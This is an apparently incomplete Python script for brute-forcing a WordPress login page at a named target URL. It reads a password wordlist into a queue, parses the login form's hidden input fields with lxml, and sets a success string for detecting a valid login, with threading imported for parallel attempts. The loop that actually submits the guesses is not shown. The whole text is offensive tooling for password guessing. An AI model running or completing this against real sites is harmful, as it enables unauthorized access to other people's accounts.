from io import BytesIO
from lxml import etree

from queue import Queue

import requests
import sys
import threading
import time

SUCCESS = "Welcome to WordPress"
TARGET = "http://boodelyboo.com/wordpress/wp-login.php"
WORDLIS = "wordlist here"


def get_words():
    with open(WORDLIS) as f:
        raw_words = f.read()

        words = Queue()
        for word in raw_words.split():
            words.put(word)

        return words


def get_params(content):
    params = dict()
    parser = etree.HTMLParser()
    tree = etree.parse(BytesIO(content), parser=parser)
    for elem in tree.findall("//input"):
        name = elem.get("name")
        if name is not None:
            params[name] = elem.get("value", None)

    return params
